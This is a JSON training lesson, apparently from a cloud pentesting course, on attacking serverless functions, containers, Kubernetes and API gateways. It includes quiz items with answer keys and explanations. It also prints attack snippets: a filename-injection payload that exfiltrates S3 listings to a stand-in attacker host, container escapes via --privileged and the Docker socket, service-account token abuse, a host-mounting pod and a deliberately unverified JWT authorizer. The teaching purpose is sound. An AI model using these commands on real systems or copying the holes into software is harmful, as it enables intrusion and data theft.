{
  "lesson_id": "b6f7a8b9-d0e1-4f2a-3b4c-5d6e7f8a9b0c",
  "domain": "cloud",
  "title": "Attacking Cloud-Native Applications: Serverless, Containers, and Microservices",
  "difficulty": 3,
  "order_index": 122,
  "prerequisites": ["a5e6f7a8-c9d0-4e1f-2a3b-4c5d6e7f8a9b"],
  "concepts": [
    "Serverless security architecture (AWS Lambda, Azure Functions)",
    "Function event injection and code execution",
    "Serverless privilege escalation via execution roles",
    "Container escape techniques",
    "Docker API exploitation",
    "Kubernetes RBAC bypass",
    "Service mesh security vulnerabilities",
    "API Gateway authentication bypass",
    "Serverless persistence mechanisms",
    "Cloud-native application supply chain attacks"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand cloud-native application architectures and attack surfaces",
    "Exploit serverless functions through event injection and misconfigurations",
    "Escalate privileges via serverless execution roles and permissions",
    "Perform container escape from Docker and containerd environments",
    "Exploit Docker API for container takeover and host access",
    "Bypass Kubernetes RBAC and access cluster secrets",
    "Attack service mesh components (Istio, Linkerd) for traffic interception",
    "Bypass API Gateway authentication and authorization controls",
    "Establish persistence in ephemeral serverless and container environments",
    "Implement detection and defense strategies for cloud-native attacks"
  ],
  "post_assessment": [
    {
      "question_id": "cnaa-001",
      "question": "An attacker has compromised an AWS Lambda function that processes S3 event notifications. What is the MOST direct privilege escalation path?",
      "options": [
        "Modify the Lambda function's VPC configuration to access internal resources",
        "Exploit the Lambda execution role's IAM permissions to access other AWS services",
        "Increase the Lambda function's memory allocation to gain more compute power",
        "Change the Lambda runtime to a different language for better exploitation tools"
      ],
      "correct_answer": 1,
      "explanation": "The Lambda execution role's IAM permissions are the most direct privilege escalation path. Lambda functions execute with an IAM role that defines what AWS services and resources they can access. If the execution role has excessive permissions (e.g., s3:*, dynamodb:*, lambda:InvokeFunction), an attacker who controls the function code can use those permissions to access other resources, invoke other functions, modify data, or escalate privileges further. VPC configuration changes require additional permissions, and memory/runtime changes don't directly grant access to other resources.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cnaa-002",
      "question": "Which Docker configuration creates the HIGHEST risk for container escape to the host?",
      "options": [
        "Running container with --read-only flag",
        "Running container with --privileged flag",
        "Running container with --network=bridge mode",
        "Running container with --restart=unless-stopped policy"
      ],
      "correct_answer": 1,
      "explanation": "Running a container with the --privileged flag is the highest risk configuration because it grants the container nearly all capabilities of the host, disables security features like AppArmor/SELinux, and provides access to all host devices. From a privileged container, an attacker can mount the host filesystem, load kernel modules, and escape containment trivially. The other options actually improve security (--read-only) or have minimal security impact (network mode, restart policy).",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "cnaa-003",
      "question": "In a Kubernetes cluster, an attacker has compromised a pod with a service account token. What is their FIRST reconnaissance action to escalate privileges?",
      "options": [
        "Attempt to create new pods in the namespace",
        "Query the Kubernetes API to enumerate the service account's RBAC permissions",
        "Scan the cluster network for exposed etcd instances",
        "Deploy a cryptominer to all available nodes"
      ],
      "correct_answer": 1,
      "explanation": "The first action should be to query the Kubernetes API to enumerate the service account's RBAC permissions using 'kubectl auth can-i --list'. This reveals what actions the compromised service account can perform, which resources it can access, and potential privilege escalation paths. Understanding current permissions is essential before attempting actions like pod creation, etcd access, or deploying miners, which may fail and trigger alerts if permissions are insufficient.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cnaa-004",
      "question": "What vulnerability class is MOST commonly exploited in serverless applications for initial access?",
      "options": [
        "SQL injection in Lambda functions connecting to RDS",
        "Server-Side Request Forgery (SSRF) to access instance metadata",
        "Event injection through unsanitized input from triggers (S3, SQS, API Gateway)",
        "Brute-force attacks against Lambda function URLs"
      ],
      "correct_answer": 2,
      "explanation": "Event injection through unsanitized input is the most common vulnerability in serverless applications. Serverless functions are event-driven and process data from various triggers (S3 uploads, SQS messages, API Gateway requests, DynamoDB streams). If functions don't properly validate and sanitize this input, attackers can inject malicious payloads that lead to code execution, command injection, or logic bypasses. While SQL injection and SSRF can occur, event injection is more prevalent due to the event-driven nature of serverless. Brute-force attacks are less effective given the ephemeral nature and throttling of serverless functions.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "cnaa-005",
      "question": "An organization uses AWS API Gateway with Lambda authorizers for authentication. What attack technique could bypass this authentication?",
      "options": [
        "Exploiting race conditions in the Lambda authorizer's token validation",
        "Using HTTP parameter pollution to confuse the authorizer logic",
        "Invoking Lambda functions directly via AWS API instead of through API Gateway",
        "Performing a denial-of-service attack to crash the authorizer"
      ],
      "correct_answer": 2,
      "explanation": "Invoking Lambda functions directly via the AWS API (using AWS credentials or compromised IAM permissions) bypasses API Gateway entirely, including the Lambda authorizer. Many developers assume API Gateway is the only entry point to their functions and don't implement additional authentication at the function level. An attacker with lambda:InvokeFunction permission can call the function directly, bypassing all Gateway-level controls (authentication, rate limiting, WAF rules). The other attacks are possible but less reliable: race conditions depend on specific implementation flaws, parameter pollution requires specific parsing vulnerabilities, and DoS doesn't grant authenticated access.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Cloud-Native Application Security! ðŸš€\n\nYou're entering the cutting edge of cloud security: serverless functions, containers, microservices, and API-driven architectures. This is where modern applications liveâ€”and where modern attacks happen.\n\nHere's the reality: **Traditional application security doesn't translate directly to cloud-native environments**. Web application firewalls designed for monolithic apps struggle with ephemeral serverless functions. Container security isn't just VM security in a smaller package. Microservices create attack surfaces that didn't exist in monolithic applications.\n\nYou've built the foundation:\n- âœ… You understand cloud pentesting methodology\n- âœ… You can discover external attack surface\n- âœ… You've attacked identity planes (Entra ID, AWS IAM)\n- âœ… You've exploited compute resources (VMs, VMSS, Automation)\n\nNow you're leveling up to **application-layer cloud attacks**:\n- Serverless function exploitation\n- Container escape techniques\n- Kubernetes cluster takeover\n- API Gateway bypass\n- Service mesh compromise\n\n**Why This Matters**:\n\nIn 2023, Datadog reported that **71% of organizations use AWS Lambda**, and **48% have adopted Kubernetes**. Cloud-native applications are the new normal. Security teams that don't understand these architectures are blind to entire attack surfaces.\n\n**Real-World Impact**:\n- **Capital One breach (2019)**: Server-Side Request Forgery (SSRF) against EC2 metadata from web application â†’ 100M+ records exposed, $200M+ cost\n- **Tesla cryptomining (2018)**: Exposed Kubernetes dashboard with no authentication â†’ cluster takeover, cryptomining deployment\n- **Serverless security incident (2021)**: Event injection in Lambda function processing S3 events â†’ command execution, data exfiltration from 14 AWS accounts\n\n**Your Mission**: Learn to think like an attacker targeting cloud-native applications. Where are the weak points in serverless architectures? How do you escape from containers? What happens when you compromise a Kubernetes service account?\n\nBy the end of this lesson, you'll have:\n- Hands-on experience exploiting serverless functions\n- Container escape techniques for Docker and Kubernetes\n- API Gateway bypass methods\n- Detection strategies for cloud-native attacks\n\n**Challenge**: Cloud-native environments are ephemeral, distributed, and dynamic. Your attacks must be fast, automated, and adaptive. Traditional persistence mechanisms don't work when your execution environment lives for 15 minutes. Traditional network scanning doesn't work when services discover each other via service mesh.\n\nThis is advanced, but you're ready. Let's master cloud-native application security! ðŸ’ª\n\n**Remember**: These techniques are for authorized penetration testing, red team operations, and CTF competitions only. Unauthorized access is illegal and unethical."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What Are Cloud-Native Applications?\n\nImagine you're building with LEGO blocks. Let's compare different ways to build:\n\n**Traditional Applications (Monolithic) = One HUGE LEGO Castle**\n- Everything is stuck together in one massive castle\n- If one piece breaks, the whole castle might collapse\n- If you want to change something, you have to take apart the entire castle\n- The castle lives in one place and doesn't move\n\n**Cloud-Native Applications = Many Small LEGO Creations**\n- Instead of one castle, you build lots of small things: a car, a house, a spaceship, a robot\n- Each small creation does ONE job (the car moves, the house stores things, the robot talks)\n- If the car breaks, the house and spaceship still work fine\n- You can replace the car with a better car without touching anything else\n- Each creation can live in different places and talk to each other\n\n### What Makes Them \"Cloud-Native\"?\n\n**1. Serverless Functions = Magic Robot Workers**\n\nImagine you have magic robot workers that only appear when you need them:\n- You clap your hands (trigger event), and a robot appears\n- The robot does ONE specific job (processes a photo, sends an email, calculates something)\n- When the job is done, the robot disappears\n- You only pay for the seconds the robot exists\n- If 1000 people clap, 1000 robots appear at once!\n\n**Real name**: AWS Lambda, Azure Functions, Google Cloud Functions\n**Cool part**: You don't need to buy or maintain robots (servers). They just appear when needed!\n**Scary part for security**: Robots can be tricked into doing bad things if you give them the wrong instructions.\n\n**2. Containers = LEGO Sets in Boxes**\n\nContainers are like individual LEGO sets, each in its own box:\n- Each box contains ONE creation (a web application, a database, a game)\n- The box has everything the creation needs (instructions, special pieces, colors)\n- You can carry the box anywhere and it works the same (laptop, cloud, friend's house)\n- Each box is isolatedâ€”if something breaks in one box, other boxes are fine\n\n**Real name**: Docker containers\n**Cool part**: Applications run the same everywhere\n**Scary part for security**: If a bad guy gets inside your box, they might try to \"escape\" to the host computer or other boxes.\n\n**3. Microservices = LEGO City with Specialized Buildings**\n\nInstead of one castle, you build an entire city with specialized buildings:\n- **Police Station** (authentication service) checks who's allowed in the city\n- **Post Office** (notification service) delivers messages\n- **Bank** (payment service) handles money\n- **Hospital** (user profile service) stores health information\n\nEach building does ONE job, and they talk to each other:\n- When you order pizza: Post Office tells Pizza Shop â†’ Bank processes payment â†’ Delivery Service brings pizza\n- If Pizza Shop breaks, the Hospital and Bank still work\n\n**Real name**: Microservices architecture\n**Cool part**: Easy to update one service without breaking everything\n**Scary part for security**: Lots of services talking = lots of places for bad guys to listen or interfere.\n\n**4. Kubernetes = The City Manager**\n\nKubernetes is like a super-smart city manager for your LEGO city:\n- Decides where to place each building (container)\n- If a building falls down, automatically rebuilds it\n- If too many people visit the Pizza Shop, creates more Pizza Shops\n- Makes sure buildings can find and talk to each other\n\n**Real name**: Kubernetes (K8s)\n**Cool part**: Automates everything, scales applications automatically\n**Scary part for security**: If a bad guy becomes the city manager, they control EVERYTHING.\n\n### Why Do Bad Guys Attack Cloud-Native Applications?\n\n**1. The \"Magic Robot\" Problem (Serverless)**\n- Robots (functions) trust the instructions they receive\n- Bad guys send tricky instructions: \"Hey robot, instead of processing this photo, can you send me all the secret data?\"\n- Robots often have keys to other services (databases, storage)\n- If you control one robot, you might control everything it has keys to\n\n**2. The \"Escape the Box\" Problem (Containers)**\n- Containers are supposed to be isolated boxes\n- But if a bad guy gets inside one box, they try to \"break out\" to the host computer\n- It's like escaping from your LEGO box to access the entire toy room\n- Once outside, they can access all the other boxes too\n\n**3. The \"City Manager\" Problem (Kubernetes)**\n- Kubernetes has a control panel (API) that manages everything\n- If bad guys get access to the control panel, they can:\n  - Read secrets (passwords, keys)\n  - Create new containers with malicious code\n  - Delete important services\n  - Take over the entire cluster\n\n**4. The \"Walkie-Talkie\" Problem (API Gateway)**\n- Cloud-native apps talk via APIs (like walkie-talkies between buildings)\n- APIs are supposed to check \"Are you allowed to talk to the Bank?\"\n- Bad guys try to:\n  - Pretend to be someone else (steal authentication tokens)\n  - Talk directly to services, bypassing the security check\n  - Listen to conversations between services\n\n### How Do We Protect Cloud-Native Applications?\n\n**For Serverless Functions**:\n- Give robots (functions) ONLY the keys they actually need\n- Check all instructions before the robot follows them\n- Watch what robots do and alert if they act weird\n\n**For Containers**:\n- Use strong boxes (secure container configurations)\n- Don't give boxes \"superuser\" powers (no --privileged flag)\n- Monitor boxes for escape attempts\n\n**For Kubernetes**:\n- Protect the city manager's control panel\n- Limit who can give commands to the city manager\n- Encrypt conversations between buildings\n\n**For APIs**:\n- Always check who's talking (authentication)\n- Make sure they're allowed to do what they're asking (authorization)\n- Monitor for suspicious conversations\n\n---\n\n**Bottom Line**: Cloud-native applications are like a LEGO city where buildings appear and disappear automatically, robots do jobs instantly, and everything talks via walkie-talkies. It's super powerful and efficient, but it creates new security challenges. Your job? Make sure the bad guys can't trick the robots, escape from boxes, become city manager, or hijack the walkie-talkies! ðŸŽ¯"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Cloud-Native Application Architecture and Attack Surface\n\nCloud-native applications represent a fundamental shift from traditional monolithic architectures. Understanding the components, interactions, and trust boundaries is essential for both attacking and defending these systems.\n\n### Cloud-Native Application Stack\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                        User / External Client                    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                             â”‚\n                             â”‚ HTTPS/REST/GraphQL\n                             â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                       API Gateway Layer                          â”‚\nâ”‚  - AWS API Gateway, Azure API Management, Kong, Apigee          â”‚\nâ”‚  - Authentication (OAuth, JWT, API Keys)                        â”‚\nâ”‚  - Rate limiting, WAF, request transformation                   â”‚\nâ”‚  - Routing to backend services                                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                             â”‚\n        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n        â”‚                    â”‚                    â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Serverless   â”‚    â”‚ Containerizedâ”‚    â”‚ Managed      â”‚\nâ”‚  Functions    â”‚    â”‚ Microservicesâ”‚    â”‚ Services     â”‚\nâ”‚               â”‚    â”‚              â”‚    â”‚              â”‚\nâ”‚ AWS Lambda    â”‚    â”‚ K8s Pods     â”‚    â”‚ RDS, S3,     â”‚\nâ”‚ Azure Functionâ”‚    â”‚ ECS Tasks    â”‚    â”‚ DynamoDB,    â”‚\nâ”‚               â”‚    â”‚ Docker       â”‚    â”‚ Cosmos DB    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜\n        â”‚                   â”‚                    â”‚\n        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                            â”‚\n                            â”‚ Service Mesh (Istio, Linkerd)\n                            â”‚ - mTLS between services\n                            â”‚ - Traffic management\n                            â”‚ - Observability\n                            â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                         Data Layer                               â”‚\nâ”‚  - Databases (SQL, NoSQL)                                       â”‚\nâ”‚  - Object Storage (S3, Azure Blob)                              â”‚\nâ”‚  - Message Queues (SQS, Service Bus)                            â”‚\nâ”‚  - Secrets Management (Key Vault, Secrets Manager)              â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Attack Surface Components\n\n#### 1. Serverless Functions (FaaS - Function as a Service)\n\n**AWS Lambda / Azure Functions / Google Cloud Functions**\n\n**Architecture**:\n- Event-driven execution (triggers: HTTP, S3, SQS, DynamoDB streams, schedules)\n- Stateless and ephemeral (execution lasts seconds to minutes)\n- Managed runtime environment (no server management)\n- Execution role/identity for accessing cloud resources\n- Cold start and warm start execution models\n\n**Attack Vectors**:\n\n**A. Event Injection**\n```python\n# Vulnerable Lambda function - Command Injection\nimport os\nimport json\n\ndef lambda_handler(event, context):\n    # Event from S3 upload trigger\n    bucket = event['Records'][0]['s3']['bucket']['name']\n    key = event['Records'][0]['s3']['object']['key']\n    \n    # VULNERABILITY: Unsanitized input in shell command\n    os.system(f\"aws s3 cp s3://{bucket}/{key} /tmp/{key}\")\n    \n    # Attacker uploads file with name: \n    # \"file.txt; curl attacker.com/exfil?data=$(aws s3 ls) #.txt\"\n    # Results in command injection!\n```\n\n**B. Execution Role Exploitation**\n```json\n// Overly permissive Lambda execution role\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:*\",  // Too broad!\n      \"Resource\": \"*\"    // All S3 buckets!\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"dynamodb:*\",  // Full DynamoDB access\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nIf an attacker compromises this function (via event injection, dependency confusion, or supply chain attack), they gain access to ALL S3 buckets and DynamoDB tables.\n\n**C. Dependency Confusion / Supply Chain**\n```javascript\n// Lambda function package.json\n{\n  \"dependencies\": {\n    \"axios\": \"^0.21.1\",\n    \"aws-sdk\": \"^2.1000.0\",\n    \"internal-company-lib\": \"^1.0.0\"  // Private package\n  }\n}\n\n// Attacker publishes malicious \"internal-company-lib\" to public npm\n// Lambda build process pulls public malicious package instead of private\n// Malicious code executes with Lambda's execution role permissions\n```\n\n**D. Environment Variable Exposure**\n```python\n# Lambda function with hardcoded secrets in environment variables\nimport os\n\nDATABASE_PASSWORD = os.environ['DB_PASSWORD']  // Visible in AWS Console!\nAPI_KEY = os.environ['THIRD_PARTY_API_KEY']   // Visible in CloudFormation!\n\n# Anyone with lambda:GetFunctionConfiguration can read these\n```\n\n#### 2. Container Security\n\n**Docker / containerd / CRI-O**\n\n**Attack Vectors**:\n\n**A. Privileged Container Escape**\n```bash\n# Container running with --privileged flag\ndocker run --privileged -it ubuntu bash\n\n# Inside container - mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\ncd /mnt/host\n\n# Now have full access to host filesystem\n# Can read /etc/shadow, install backdoors, access other containers\n```\n\n**B. Docker Socket Mount Escape**\n```bash\n# Container with Docker socket mounted\ndocker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash\n\n# Inside container - use Docker socket to create privileged container\napt-get update && apt-get install -y docker.io\n\n# Create new privileged container with host filesystem mounted\ndocker run -v /:/host -it --privileged ubuntu bash\n\n# Now have root access to host\nchroot /host\n```\n\n**C. Kernel Exploit for Container Escape**\n```c\n// Dirty COW (CVE-2016-5195) - privilege escalation from container to host\n// Exploit race condition in copy-on-write to gain write access to read-only memory\n// Can modify /etc/passwd, gain root on host\n\n// Other kernel exploits:\n// - CVE-2022-0847 (Dirty Pipe)\n// - CVE-2021-22555 (Netfilter heap overflow)\n// - CVE-2020-14386 (AF_PACKET socket)\n```\n\n**D. Insecure Container Image**\n```dockerfile\n# Vulnerable Dockerfile\nFROM ubuntu:latest  # Old base image with vulnerabilities\n\nRUN apt-get update && apt-get install -y openssh-server\n\n# Running as root (default)\nUSER root  # Never run containers as root!\n\n# Hardcoded secrets\nENV DATABASE_PASSWORD=\"SuperSecret123\"  # Visible in image layers!\n\n# Exposed Docker socket\nVOLUME /var/run/docker.sock  # Allows container escape\n\nCMD [\"/usr/sbin/sshd\", \"-D\"]  # SSH in container = bad practice\n```\n\n#### 3. Kubernetes (K8s) Security\n\n**Attack Vectors**:\n\n**A. RBAC Misconfiguration**\n```yaml\n# Overly permissive ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: default-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin  # Full cluster admin!\nsubjects:\n- kind: ServiceAccount\n  name: default  # Default service account in all namespaces!\n  namespace: default\n\n# Every pod in default namespace has cluster-admin privileges\n```\n\n**B. Service Account Token Theft**\n```bash\n# From inside a compromised pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# Use token to query Kubernetes API\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nCACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nAPIURL=https://kubernetes.default.svc\n\n# Enumerate permissions\ncurl --cacert $CACERT --header \"Authorization: Bearer $TOKEN\" \\\n  $APIURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews -X POST \\\n  -d '{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"*\",\"resource\":\"*\"}}}'\n\n# Create privileged pod for host access\ncurl --cacert $CACERT --header \"Authorization: Bearer $TOKEN\" \\\n  $APIURL/api/v1/namespaces/default/pods -X POST -H \"Content-Type: application/json\" \\\n  -d '{...privileged pod spec...}'\n```\n\n**C. Exposed Kubernetes Dashboard**\n```bash\n# Kubernetes Dashboard with no authentication (Tesla 2018 breach)\n# Attacker accesses http://kubernetes-dashboard.company.com\n# Dashboard has cluster-admin permissions\n# Attacker can:\n#   - View all secrets (database passwords, API keys)\n#   - Create new pods with malicious containers\n#   - Execute commands in any pod\n#   - Deploy cryptominers across cluster\n```\n\n**D. Pod Escape to Node**\n```yaml\n# Pod with hostPath volume mount\napiVersion: v1\nkind: Pod\nmetadata:\n  name: host-access-pod\nspec:\n  containers:\n  - name: evil-container\n    image: attacker/malicious:latest\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /  # Mount entire host filesystem!\n      type: Directory\n  hostNetwork: true  # Use host network namespace\n  hostPID: true      # Use host PID namespace\n```\n\n#### 4. API Gateway Security\n\n**Attack Vectors**:\n\n**A. Authentication Bypass**\n```javascript\n// Lambda Authorizer vulnerability - improper validation\nexports.handler = async (event) => {\n    const token = event.headers.Authorization;\n    \n    // VULNERABILITY: Trusts any JWT without signature verification\n    const decoded = jwt.decode(token, {complete: false});  // No verify!\n    \n    if (decoded && decoded.sub) {\n        return generatePolicy('user', 'Allow', event.methodArn);\n    }\n    \n    return generatePolicy('user', 'Deny', event.methodArn);\n};\n\n// Attacker creates self-signed JWT with arbitrary claims\n// API Gateway authorizer accepts it without verification\n```\n\n**B. Direct Function Invocation (Bypass Gateway)**\n```bash\n# Application assumes API Gateway is only entry point\n# But attackers with AWS credentials can invoke directly\n\naws lambda invoke \\\n  --function-name \"ProcessPayment\" \\\n  --payload '{\"amount\": 0.01, \"user_id\": \"attacker\"}' \\\n  --region us-east-1 \\\n  response.json\n\n# Bypasses API Gateway authentication, rate limiting, WAF\n```\n\n**C. API Gateway Resource Policy Misconfiguration**\n```json\n// Overly permissive API Gateway resource policy\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",  // Anyone!\n      \"Action\": \"execute-api:Invoke\",\n      \"Resource\": \"*\"    // All methods!\n    }\n  ]\n}\n// Intended to be public, but exposes admin endpoints too\n```\n\n### Common Vulnerability Patterns\n\n**1. Overly Permissive IAM Roles**\n- Serverless functions with `*:*` permissions\n- Container execution roles with broad data plane access\n- Service accounts with `cluster-admin` in Kubernetes\n\n**2. Missing Input Validation**\n- Event injection in serverless functions\n- Command injection in container entrypoints\n- API parameter tampering\n\n**3. Insecure Secrets Management**\n- Hardcoded secrets in environment variables\n- Secrets in container images\n- Kubernetes secrets stored as base64 (not encrypted)\n\n**4. Lack of Network Segmentation**\n- All microservices can talk to all others\n- No network policies in Kubernetes\n- Flat VPC networking without security groups\n\n**5. Supply Chain Vulnerabilities**\n- Unvetted dependencies in function packages\n- Vulnerable base container images\n- Compromised CI/CD pipelines\n\nIn the following sections, we'll dive deep into exploiting each component with hands-on labs, real-world case studies, and defensive strategies."
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Pentester",
    "Career Path: Red Teamer"
  ]
}
